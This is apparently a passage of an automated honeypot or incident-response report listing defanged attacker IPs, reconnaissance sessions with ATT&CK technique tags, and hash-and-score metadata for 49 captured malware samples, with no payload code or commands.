| IR-ef3d98bdaf42 | HIGH | `112.151.168[.]124` | 2026-10-22 07:49 | Y | 0 | 0 | `T1078 · T1592` |
| IR-32bcb88be0a8 | HIGH | `179.43.153[.]2` | 2026-10-22 08:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-24f43030fb98 | HIGH | `176.53.159[.]196` | 2026-10-22 08:24 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0cd9b99920b4 | HIGH | `195.178.191[.]5` | 2026-10-22 08:50 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-0bb865f4a4f4 | HIGH | `195.178.191[.]5` | 2026-10-22 08:50 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e10930bb85e7 | HIGH | `182.73.176[.]186` | 2026-10-22 08:50 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-11115eb5c575 | HIGH | `182.73.176[.]186` | 2026-10-22 08:50 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b10aaf765033 | HIGH | `187.141.71[.]166` | 2026-10-22 08:52 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-754ff39a1a14 | HIGH | `145.239.78[.]180` | 2026-10-22 08:52 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f947d203f59e | HIGH | `187.141.71[.]166` | 2026-10-22 08:52 | Y | 0 | 0 | `T1078 · T1592` |
| IR-54ccd4cbb7f8 | HIGH | `145.239.78[.]180` | 2026-10-22 08:52 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b8408d2ef1c2 | HIGH | `192.9.228[.]120` | 2026-10-22 08:52 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-40e1f39412ba | HIGH | `192.9.228[.]120` | 2026-10-22 08:52 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0d245e3eb167 | HIGH | `187.154.96[.]215` | 2026-10-22 08:54 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-b5c35bec2591 | HIGH | `35.221.138[.]107` | 2026-10-22 08:54 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-fabeb211a732 | HIGH | `187.154.96[.]215` | 2026-10-22 08:54 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2118bce610e0 | HIGH | `35.221.138[.]107` | 2026-10-22 08:54 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1e0bbb998ddd | HIGH | `97.93.43[.]157` | 2026-10-22 08:55 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-dfe9a0d4556f | HIGH | `97.93.43[.]157` | 2026-10-22 08:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6719bea5668b | HIGH | `154.116.254[.]157` | 2026-10-22 08:55 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-cdd12540acb0 | HIGH | `154.116.254[.]157` | 2026-10-22 08:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-32415c023e55 | HIGH | `120.48.53[.]174` | 2026-10-22 08:57 | Y | 1 | 0 | `T1078 · T1592` |
| IR-28dfa6902eb8 | HIGH | `64.99.117[.]209` | 2026-10-22 09:00 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-105c3a9b4408 | HIGH | `64.99.117[.]209` | 2026-10-22 09:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-05a0fe48e7d7 | HIGH | `197.44.229[.]34` | 2026-10-22 09:00 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f470f55007fe | HIGH | `197.44.229[.]34` | 2026-10-22 09:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d5a391126e0a | HIGH | `103.86.198[.]162` | 2026-10-22 09:01 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-843fee4cb6fc | HIGH | `103.86.198[.]162` | 2026-10-22 09:01 | Y | 0 | 0 | `T1078 · T1592` |
| IR-738a206465f1 | HIGH | `112.216.120[.]67` | 2026-10-22 09:02 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-522a53a7d0c9 | HIGH | `112.216.120[.]67` | 2026-10-22 09:02 | Y | 0 | 0 | `T1078 · T1592` |
| IR-67059c11bd0f | HIGH | `120.48.39[.]143` | 2026-10-22 09:03 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e6eb65bc872f | HIGH | `193.112.192[.]91` | 2026-10-22 09:36 | Y | 1 | 0 | `T1078 · T1592` |
| IR-1af1471ba164 | HIGH | `193.112.192[.]91` | 2026-10-22 09:37 | Y | 0 | 0 | `T1078 · T1592` |
_… 57 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `222.104.243[.]76` | **4** | 2026-10-22 09:54 | 2026-10-22 14:10 | 1m | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | **3** | 2026-10-22 02:15 | 2026-10-22 06:05 | 2m | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | **3** | 2026-10-22 08:53 | 2026-10-22 12:17 | 2m | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]117` | **2** | 2026-10-22 09:49 | 2026-10-22 10:44 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `109.160.32[.]163` | **2** | 2026-10-22 10:46 | 2026-10-22 12:11 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `130.12.180[.]174` | **2** | 2026-10-22 05:03 | 2026-10-22 06:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | **2** | 2026-10-22 10:21 | 2026-10-22 12:19 | 2m | 0 | `T1592` | 🟢 LOW |
| `220.74.36[.]3` | **2** | 2026-10-22 13:49 | 2026-10-22 14:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `221.156.173[.]44` | **2** | 2026-10-22 01:47 | 2026-10-22 02:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `46.36.123[.]88` | **2** | 2026-10-22 13:59 | 2026-10-22 14:07 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.104.49[.]37` | 1 | 2026-10-22 07:07 | 2026-10-22 07:08 | 12s | 0 | `T1592` | 🟢 LOW |
| `103.255.200[.]90` | 1 | 2026-10-22 12:20 | 2026-10-22 12:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `104.155.84[.]46` | 1 | 2026-10-22 06:28 | 2026-10-22 06:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `104.199.79[.]62` | 1 | 2026-10-22 04:58 | 2026-10-22 04:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `106.12.24[.]167` | 1 | 2026-10-22 10:24 | 2026-10-22 10:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]169` | 1 | 2026-10-22 12:49 | 2026-10-22 12:49 | 8s | 0 | `T1592` | 🟢 LOW |
| `110.166.87[.]119` | 1 | 2026-10-22 02:38 | 2026-10-22 02:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `110.41.134[.]170` | 1 | 2026-10-22 03:20 | 2026-10-22 03:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `113.31.115[.]157` | 1 | 2026-10-22 05:19 | 2026-10-22 05:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.191.32[.]68` | 1 | 2026-10-22 10:49 | 2026-10-22 10:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.196.118[.]181` | 1 | 2026-10-22 14:23 | 2026-10-22 14:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `119.199.176[.]30` | 1 | 2026-10-22 14:09 | 2026-10-22 14:09 | 21s | 0 | `T1592` | 🟢 LOW |
| `119.201.97[.]62` | 1 | 2026-10-22 13:05 | 2026-10-22 13:05 | 21s | 0 | `T1592` | 🟢 LOW |
| `120.48.31[.]12` | 1 | 2026-10-22 10:22 | 2026-10-22 10:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.53[.]174` | 1 | 2026-10-22 08:57 | 2026-10-22 08:57 | 3s | 0 | `T1592` | 🟢 LOW |
| `120.48.60[.]44` | 1 | 2026-10-22 13:07 | 2026-10-22 13:08 | 23s | 0 | `T1592` | 🟢 LOW |
| `121.155.6[.]214` | 1 | 2026-10-22 14:13 | 2026-10-22 14:13 | 19s | 0 | `T1592` | 🟢 LOW |
| `121.187.53[.]248` | 1 | 2026-10-22 10:29 | 2026-10-22 10:29 | 17s | 0 | `T1592` | 🟢 LOW |
| `122.3.6[.]113` | 1 | 2026-10-22 07:54 | 2026-10-22 07:55 | 24s | 0 | `T1592` | 🟢 LOW |
| `122.3.6[.]113` | 1 | 2026-10-22 11:24 | 2026-10-22 11:24 | 16s | 0 | `T1592` | 🟢 LOW |
| `122.97.136[.]211` | 1 | 2026-10-22 13:56 | 2026-10-22 13:56 | 11s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-22 02:07 | 2026-10-22 02:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-22 11:19 | 2026-10-22 11:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-22 14:03 | 2026-10-22 14:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.131.162[.]132` | 1 | 2026-10-22 12:47 | 2026-10-22 12:47 | 9s | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | 1 | 2026-10-22 08:19 | 2026-10-22 08:19 | 47s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-10-22 02:05 | 2026-10-22 02:06 | 45s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-10-22 06:36 | 2026-10-22 06:36 | 34s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-10-22 14:35 | 2026-10-22 14:35 | 39s | 0 | `T1592` | 🟢 LOW |
| `143.198.208[.]150` | 1 | 2026-10-22 04:53 | 2026-10-22 04:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `143.198.208[.]150` | 1 | 2026-10-22 07:34 | 2026-10-22 07:35 | 56s | 0 | `T1592` | 🟢 LOW |
| `143.198.208[.]150` | 1 | 2026-10-22 10:13 | 2026-10-22 10:14 | 51s | 0 | `T1592` | 🟢 LOW |
| `143.198.208[.]150` | 1 | 2026-10-22 13:04 | 2026-10-22 13:05 | 36s | 0 | `T1592` | 🟢 LOW |
| `168.227.200[.]165` | 1 | 2026-10-22 13:00 | 2026-10-22 13:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `169.212.149[.]252` | 1 | 2026-10-22 02:40 | 2026-10-22 02:41 | 25s | 0 | `T1592` | 🟢 LOW |
| `169.58.33[.]158` | 1 | 2026-10-22 07:35 | 2026-10-22 07:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.105.128[.]12` | 1 | 2026-10-22 07:08 | 2026-10-22 07:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.235.40[.]131` | 1 | 2026-10-22 03:54 | 2026-10-22 03:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.235.41[.]44` | 1 | 2026-10-22 05:09 | 2026-10-22 05:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]229` | 1 | 2026-10-22 10:36 | 2026-10-22 10:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `175.202.194[.]168` | 1 | 2026-10-22 04:02 | 2026-10-22 04:03 | 24s | 0 | `T1592` | 🟢 LOW |
| `176.65.132[.]132` | 1 | 2026-10-22 14:20 | 2026-10-22 14:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `178.132.198[.]200` | 1 | 2026-10-22 10:46 | 2026-10-22 10:47 | 15s | 0 | `T1592` | 🟢 LOW |
| `178.150.175[.]48` | 1 | 2026-10-22 11:02 | 2026-10-22 11:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `179.43.153[.]2` | 1 | 2026-10-22 04:20 | 2026-10-22 04:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.76.105[.]165` | 1 | 2026-10-22 02:42 | 2026-10-22 02:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `181.198.55[.]155` | 1 | 2026-10-22 14:26 | 2026-10-22 14:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `181.46.9[.]19` | 1 | 2026-10-22 12:36 | 2026-10-22 12:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `182.61.20[.]116` | 1 | 2026-10-22 09:49 | 2026-10-22 09:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `188.213.65[.]234` | 1 | 2026-10-22 06:59 | 2026-10-22 06:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.112.192[.]91` | 1 | 2026-10-22 05:13 | 2026-10-22 05:15 | 120s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `193.112.192[.]91` | 1 | 2026-10-22 09:36 | 2026-10-22 09:36 | 2s | 0 | `T1592` | 🟢 LOW |
| `195.18.19[.]71` | 1 | 2026-10-22 11:59 | 2026-10-22 12:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `198.91.171[.]245` | 1 | 2026-10-22 12:12 | 2026-10-22 12:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]238` | 1 | 2026-10-22 01:23 | 2026-10-22 01:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]74` | 1 | 2026-10-22 11:20 | 2026-10-22 11:20 | 7s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.221.75[.]0` | 1 | 2026-10-22 13:23 | 2026-10-22 13:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `209.99.190[.]47` | 1 | 2026-10-22 01:44 | 2026-10-22 01:45 | 0s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `211.225.18[.]106` | 1 | 2026-10-22 13:41 | 2026-10-22 13:41 | 16s | 0 | `T1592` | 🟢 LOW |
| `218.206.136[.]24` | 1 | 2026-10-22 13:57 | 2026-10-22 13:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `218.27.202[.]178` | 1 | 2026-10-22 02:27 | 2026-10-22 02:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `218.6.105[.]12` | 1 | 2026-10-22 06:18 | 2026-10-22 06:18 | 22s | 0 | `T1592` | 🟢 LOW |
| `218.60.77[.]234` | 1 | 2026-10-22 02:16 | 2026-10-22 02:16 | 1s | 0 | `T1592` | 🟢 LOW |
| `218.78.80[.]37` | 1 | 2026-10-22 06:35 | 2026-10-22 06:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `220.77.37[.]205` | 1 | 2026-10-22 11:42 | 2026-10-22 11:42 | 21s | 0 | `T1592` | 🟢 LOW |
| `220.93.200[.]5` | 1 | 2026-10-22 14:27 | 2026-10-22 14:28 | 27s | 0 | `T1592` | 🟢 LOW |
| `222.117.7[.]182` | 1 | 2026-10-22 10:10 | 2026-10-22 10:10 | 16s | 0 | `T1592` | 🟢 LOW |
| `3.130.168[.]2` | 1 | 2026-10-22 06:29 | 2026-10-22 06:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `34.78.18[.]81` | 1 | 2026-10-22 06:26 | 2026-10-22 06:26 | 4s | 0 | `T1592` | 🟢 LOW |
| `34.79.51[.]154` | 1 | 2026-10-22 04:16 | 2026-10-22 04:16 | 4s | 0 | `T1592` | 🟢 LOW |
| `35.195.24[.]58` | 1 | 2026-10-22 03:51 | 2026-10-22 03:51 | 6s | 0 | `T1592` | 🟢 LOW |
| `36.255.97[.]33` | 1 | 2026-10-22 02:19 | 2026-10-22 02:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `38.110.46[.]236` | 1 | 2026-10-22 11:34 | 2026-10-22 11:35 | 60s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-10-22 04:08 | 2026-10-22 04:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-10-22 07:06 | 2026-10-22 07:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]61` | 1 | 2026-10-22 01:11 | 2026-10-22 01:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]61` | 1 | 2026-10-22 10:53 | 2026-10-22 10:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.156.128[.]168` | 1 | 2026-10-22 04:55 | 2026-10-22 04:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.156.128[.]170` | 1 | 2026-10-22 04:55 | 2026-10-22 04:55 | 5s | 0 | `T1592` | 🟢 LOW |
| `45.198.224[.]48` | 1 | 2026-10-22 08:22 | 2026-10-22 08:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.61.133[.]121` | 1 | 2026-10-22 01:45 | 2026-10-22 01:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]134` | 1 | 2026-10-22 02:44 | 2026-10-22 02:44 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.79.172[.]21` | 1 | 2026-10-22 05:09 | 2026-10-22 05:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `47.120.4[.]180` | 1 | 2026-10-22 05:44 | 2026-10-22 05:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `5.181.86[.]60` | 1 | 2026-10-22 11:48 | 2026-10-22 11:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `5.59.98[.]28` | 1 | 2026-10-22 12:15 | 2026-10-22 12:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | 1 | 2026-10-22 04:09 | 2026-10-22 04:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `52.248.43[.]126` | 1 | 2026-10-22 01:10 | 2026-10-22 01:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `54.204.71[.]163` | 1 | 2026-10-22 01:31 | 2026-10-22 01:31 | 1s | 0 | `T1592` | 🟢 LOW |
| `58.222.244[.]226` | 1 | 2026-10-22 06:35 | 2026-10-22 06:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]253` | 1 | 2026-10-22 13:08 | 2026-10-22 13:08 | 1s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]197` | 1 | 2026-10-22 01:45 | 2026-10-22 01:45 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]46` | 1 | 2026-10-22 05:24 | 2026-10-22 05:24 | 4s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]192` | 1 | 2026-10-22 01:37 | 2026-10-22 01:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]184` | 1 | 2026-10-22 10:34 | 2026-10-22 10:34 | 2s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]37` | 1 | 2026-10-22 09:43 | 2026-10-22 09:43 | 3s | 0 | `T1592` | 🟢 LOW |
| `66.228.62[.]150` | 1 | 2026-10-22 09:35 | 2026-10-22 09:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `71.6.146[.]185` | 1 | 2026-10-22 05:03 | 2026-10-22 05:03 | 4s | 0 | `T1592` | 🟢 LOW |
| `71.6.146[.]186` | 1 | 2026-10-22 09:40 | 2026-10-22 09:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `74.82.47[.]2` | 1 | 2026-10-22 09:16 | 2026-10-22 09:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-22 10:14 | 2026-10-22 10:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-22 13:35 | 2026-10-22 13:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]14` | 1 | 2026-10-22 10:18 | 2026-10-22 10:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `79.106.151[.]235` | 1 | 2026-10-22 04:10 | 2026-10-22 04:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]11` | 1 | 2026-10-22 02:32 | 2026-10-22 02:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]17` | 1 | 2026-10-22 14:48 | 2026-10-22 14:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]6` | 1 | 2026-10-22 14:47 | 2026-10-22 14:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `86.211.154[.]149` | 1 | 2026-10-22 02:19 | 2026-10-22 02:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]196` | 1 | 2026-10-22 01:10 | 2026-10-22 01:10 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
